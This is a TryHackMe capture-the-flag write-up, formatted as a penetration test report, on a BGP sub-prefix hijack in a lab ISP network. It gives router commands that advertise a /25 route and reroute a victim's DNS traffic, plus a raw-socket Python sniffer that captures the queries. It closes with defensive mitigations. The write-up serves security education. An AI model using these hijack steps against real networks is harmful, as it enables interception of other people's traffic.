# Penetration Test Report: TryHackMe — "Operation Reroute"

| Field | Details |
|---|---|
| Room Name | Operation Reroute |
| Platform | TryHackMe |
| Category | Network Security / BGP Hijacking |
| Difficulty | Medium |
| Room Author | munra |
| Flag | `THM{REDACTED}` |

## 1. Executive Summary

This report documents the successful exploitation of a BGP sub-prefix hijacking vulnerability in a simulated ISP environment. The objective was to intercept DNS traffic destined for a VIP user by rerouting it through an attacker-controlled autonomous system.

The attack succeeded by exploiting the longest-prefix match rule in BGP routing. By advertising a more-specific `/25` prefix from AS 1111, the attacker caused the victim's traffic (intended for AS 3333) to be redirected to a Kali machine under the attacker's control. DNS queries were captured, and the flag was extracted via base64 decoding.

**Risk Rating:** Critical (simulated)
**Impact:** Complete compromise of DNS confidentiality for targeted users.

## 2. Scope & Rules of Engagement

- **Target:** TryRouteMe router (`192.168.1.1`), AS 1111
- **Victim:** VIP user in AS 2222 (`192.168.2.100`)
- **Real DNS Server:** `10.10.10.10` in AS 3333
- **Attacker Infrastructure:** Kali jumpbox (`192.168.1.100`)
- **Authorization:** TryHackMe lab environment — legal and ethical

## 3. Network Topology

```text
┌─────────────────────┐     ┌─────────────────────┐     ┌─────────────────────┐
│      AS 1111        │     │      AS 2222        │     │      AS 3333        │
│                      │     │                      │     │                      │
│  ┌──────────────┐    │     │  ┌──────────────┐    │     │  ┌──────────────┐    │
│  │  TryRouteMe   │◄───┼─────┼──│     TIWS     │────┼─────┼──│   NICENET    │    │
│  │  (ttm router) │    │     │  │              │    │     │  │   (DNS2)     │    │
│  └──────┬────────┘    │     │  └──────┬───────┘    │     │  └──────────────┘    │
│         │             │     │         │            │     │                      │
│  ┌──────┴────────┐    │     │  ┌──────┴───────┐    │     │                      │
│  │     Kali      │    │     │  │    Victim    │    │     │                      │
│  │ 192.168.1.100 │    │     │  │192.168.2.100 │    │     │                      │
│  └───────────────┘    │     │  └──────────────┘    │     │                      │
│                      │     │                      │     │                      │
│  ┌──────────────┐    │     │                      │     │                      │
│  │     DNS1      │    │     │                      │     │                      │
│  │  10.10.10.10  │    │     │                      │     │                      │
│  └──────────────┘    │     │                      │     │                      │
└─────────────────────┘     └─────────────────────┘     └─────────────────────┘
```

**Key observation:** Two DNS servers share the same IP `10.10.10.10` in different ASes (1111 and 3333). The victim's queries currently go to AS 3333.

## 4. Reconnaissance

### 4.1 Access

```bash
telnet MACHINE_IP 6001
ssh ttm@192.168.1.1    # password: ttm2024
```

Landed in the FRRouting (FRR) v10.0 CLI.

### 4.2 Configuration Review

```bash
TTM-CORE-01# show running-config
```

Key findings:

| Component | Detail |
|---|---|
| Hostname | TTM-CORE-01 |
| Local AS | 1111 |
| BGP Neighbor | 10.1.1.2 (TIWS, AS 2222) |
| Interfaces | eth0 (192.168.1.1/24), eth1 (10.1.1.1/30), eth2 (10.10.10.1/24) |
| Outbound filter | Permits `192.168.1.0/24` and `10.10.10.0/24` only |

### 4.3 BGP Table Analysis

```bash
TTM-CORE-01# show ip bgp
```

```text
Network           Next Hop             Metric LocPrf Weight Path
*> 10.1.1.0/30       0.0.0.0                   0         32768 ?
*  10.10.10.0/24     10.1.1.2                                0 2222 3333 i
*                    0.0.0.0                   0         32768 ?
*>                   0.0.0.0                   0         32768 i
*  192.168.1.0/24    0.0.0.0                   0         32768 ?
*>                   0.0.0.0                   0         32768 i
*> 192.168.2.0/24    10.1.1.2                  0             0 2222 i
```

**Finding:** `10.10.10.0/24` appears twice — locally originated and via AS 3333. TIWS (AS 2222) prefers the shorter path through AS 3333. This is why the victim's traffic bypasses AS 1111.

## 5. Vulnerability Analysis

### 5.1 Root Cause

BGP has no built-in authentication of prefix ownership. Any AS can announce any prefix, and neighbors trust those announcements. Combined with the longest-prefix match rule, an attacker can hijack traffic by advertising a more-specific prefix.

### 5.2 Attack Vector

| Legitimate Route | Hijack Route | Winner |
|---|---|---|
| `10.10.10.0/24` (AS 3333) | `10.10.10.0/25` (AS 1111) | Hijack — more specific |
| Path: 2222 3333 | Path: 1111 | Longest-prefix match wins |

The `/25` covers `.0`–`.127`, which includes `10.10.10.10`. BGP installs both routes as separate entries; the forwarding table uses the `/25`.

## 6. Exploitation

### 6.1 Router Configuration Changes

```bash
TTM-CORE-01# configure terminal

# Step 1: Allow the /25 through the outbound filter
TTM-CORE-01(config)# ip prefix-list bgp-out seq 15 permit 10.10.10.0/25

# Step 2: Create a static route for BGP to originate the /25
TTM-CORE-01(config)# ip route 10.10.10.0/25 10.10.10.1

# Step 3: Advertise the /25 via BGP (the hijack)
TTM-CORE-01(config)# router bgp 1111
TTM-CORE-01(config-router)#  address-family ipv4 unicast
TTM-CORE-01(config-router-af)#  network 10.10.10.0/25
TTM-CORE-01(config-router-af)#  exit-address-family
TTM-CORE-01(config-router)# exit

# Step 4: Redirect victim traffic to Kali
TTM-CORE-01(config)# ip route 10.10.10.10/32 192.168.1.100
TTM-CORE-01(config)# end
```

Verification:

```bash
TTM-CORE-01# show ip bgp
```

```text
*> 10.10.10.0/25    0.0.0.0                  0         32768 i
```

The `/25` is now in the BGP table and being advertised to TIWS.

### 6.2 Kali Preparation

```bash
# Assign the DNS server IP to Kali's interface
ip addr add 10.10.10.10/32 dev eth0

# Verify
ip addr show eth0 | grep 10.10.10.10
# inet 10.10.10.10/32 scope global eth0
```

Without this, Kali's kernel would drop incoming packets destined for `10.10.10.10`.

### 6.3 DNS Sniffer

```python
import socket, struct

def parse_dns_name(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            break
        offset += 1
        labels.append(data[offset:offset+length].decode())
        offset += length
    return '.'.join(labels)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
print("Listening for DNS queries...")
while True:
    data, addr = s.recvfrom(65535)
    ip_header_len = (data[0] & 0x0F) * 4
    dst_port = struct.unpack('!H', data[ip_header_len+2:ip_header_len+4])[0]
    if dst_port == 53:
        try:
            dns_data = data[ip_header_len+8:]
            name = parse_dns_name(dns_data, 12)
            src_ip = socket.inet_ntoa(data[12:16])
            dst_ip = socket.inet_ntoa(data[16:20])
            print(f"DNS Query: {name} from {src_ip} to {dst_ip}")
        except:
            pass
```

Execution:

```bash
python3 /tmp/dns_sniff.py
```

Output (Redacted):

```text
DNS Query: [REDACTED_BASE64_FLAG].[REDACTED_DOMAIN] from 192.168.2.100 to 10.10.10.10
DNS Query: [REDACTED_BASE64_FLAG].[REDACTED_DOMAIN] from 192.168.2.100 to 10.10.10.10
DNS Query: [REDACTED_BASE64_FLAG].[REDACTED_DOMAIN] from 192.168.2.100 to 10.10.10.10
...
```

### 6.4 Flag Extraction

```bash
echo "[REDACTED_BASE64_FLAG]" | base64 -d
```

Output:

```text
THM{REDACTED}
```

## 7. Attack Chain Summary

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. RECON                                                                     │
│    - Inspect FRR config, BGP table, neighbors                               │
│    - Identify that victim traffic prefers AS 3333 over AS 1111              │
├───────────────────────────────────────────────────────────────────────────── ┤
│ 2. HIJACK                                                                    │
│    - Add /25 to outbound prefix filter                                      │
│    - Create static route for /25                                            │
│    - Advertise /25 via BGP network statement                                │
│    - Redirect 10.10.10.10/32 to Kali (192.168.1.100)                        │
├───────────────────────────────────────────────────────────────────────────── ┤
│ 3. PREPARE KALI                                                              │
│    - Assign 10.10.10.10/32 to eth0                                          │
│    - Run raw-socket DNS sniffer                                             │
├───────────────────────────────────────────────────────────────────────────── ┤
│ 4. CAPTURE                                                                   │
│    - Victim DNS queries arrive at Kali                                      │
│    - Base64-encoded flag extracted from subdomain                           │
├───────────────────────────────────────────────────────────────────────────── ┤
│ 5. DECODE                                                                    │
│    - Decode base64 string → [REDACTED]                                      │
└───────────────────────────────────────────────────────────────────────────── ┘
```

## 8. Impact Assessment

| Impact Area | Description |
|---|---|
| Confidentiality | Complete loss — all DNS queries for targeted prefix captured |
| Integrity | Potential — DNS responses could be spoofed for phishing |
| Availability | Degraded in this lab (queries never answered); stealthier versions preserve it |
| Scope | Affects all users whose traffic routes through the hijacked prefix |

## 9. Detection & Mitigation

| Control | Purpose |
|---|---|
| RPKI (Resource Public Key Infrastructure) | Cryptographic proof of prefix ownership; prevents unauthorized announcements |
| BGP Monitoring (BGPMon, RIPE RIS) | Alerts on suspicious prefix announcements |
| Prefix Filtering (IRR-based) | Reject routes that don't match registered policy |
| DNSSEC | Cryptographic signatures on DNS responses; prevents spoofing |
| HSTS / HTTPS everywhere | Encrypts traffic; attacker sees only metadata |
| Certificate pinning | Prevents fake certificates even if DNS is spoofed |

## 10. Lessons Learned

- BGP has no built-in authentication — neighbors trust announcements.
- Longest-prefix match is unconditional — a `/25` beats a `/24` regardless of origin.
- Prefix filters matter — without updating `bgp-out`, the hijack route is silently dropped.
- Kali must own the IP — otherwise the kernel drops packets for the hijacked destination.
- The attack is silent on the routing side — but breaking DNS resolution is a detectable symptom.

## 11. Conclusion

The "Operation Reroute" lab successfully demonstrates a real-world BGP sub-prefix hijacking attack. The exploit required only four router configuration changes and a small Python sniffer, yet resulted in complete interception of a target user's DNS traffic.

While the lab's simplified environment makes the attack straightforward, the underlying vulnerability is a genuine threat to internet routing security. Defenses like RPKI and DNSSEC are critical to preventing such attacks in production networks.

## Appendix A: Command Reference

| Purpose | Command |
|---|---|
| View config | `show running-config` |
| View BGP table | `show ip bgp` |
| View BGP summary | `show ip bgp summary` |
| View advertised routes | `show ip bgp neighbors 10.1.1.2 advertised-routes` |
| Add prefix filter | `ip prefix-list bgp-out seq 15 permit 10.10.10.0/25` |
| Add static route | `ip route 10.10.10.0/25 10.10.10.1` |
| Advertise prefix | `network 10.10.10.0/25` (under `router bgp`) |
| Redirect traffic | `ip route 10.10.10.10/32 192.168.1.100` |

## Appendix B: Flag

```text
THM{REDACTED}
```

---

*Lab completed on TryHackMe — "Operation Reroute" by munra.*